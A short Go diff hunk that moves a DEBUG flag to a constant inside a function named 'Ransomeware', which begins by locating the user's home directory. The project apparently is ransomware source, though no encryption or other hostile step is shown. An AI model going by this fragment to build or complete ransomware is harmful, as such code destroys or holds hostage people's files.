@@ -11,8 +11,9 @@ import (
 	"path/filepath"
 )
 
+const DEBUG bool = true // false for production
+
 func Ransomeware() {
-	DEBUG := true //change it to false while deploying
 	homeDir, err := os.UserHomeDir()
 	if err != nil {
 		log.Fatal(err)
